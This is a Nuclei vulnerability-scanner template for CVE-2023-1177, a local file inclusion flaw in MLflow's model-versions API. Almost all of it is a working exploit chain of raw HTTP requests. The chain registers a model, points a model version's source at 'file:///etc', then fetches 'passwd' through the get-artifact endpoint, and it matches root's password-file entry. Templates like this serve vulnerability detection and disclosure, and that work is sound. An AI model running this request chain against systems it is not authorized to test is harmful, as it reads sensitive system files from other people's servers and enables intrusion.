id: mlflow-model-versions-lfi

info:
  name: MLFlow LFI via model-versions API endpoint
  author: danmcinerney (Vuln Discovery), byt3bl33d3r (Nuclei Template)
  severity: high
  description: MLFlow is vulnerable to a LFI via it's model-versions API endpoint
  reference:
    - https://huntr.com/bounties/1fe8f21a-c438-4cba-9add-e8a5dab94e28/
  classification:
    cvss-score: 9.3
    cve-id: CVE-2023-1177
    cwe-id: CWE-29
  tags: mlflow,ml,cve,protectai,huntr

variables:
  experiment_name: "{{rand_text_alpha(6)}}"

http:
  - raw:
      - |
        POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name": "{{experiment_name}}"}

      - |
        POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name": "{{experiment_name}}", "source": "file:///etc"}

      - |
        GET /model-versions/get-artifact?path=passwd&name={{experiment_name}}&version=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
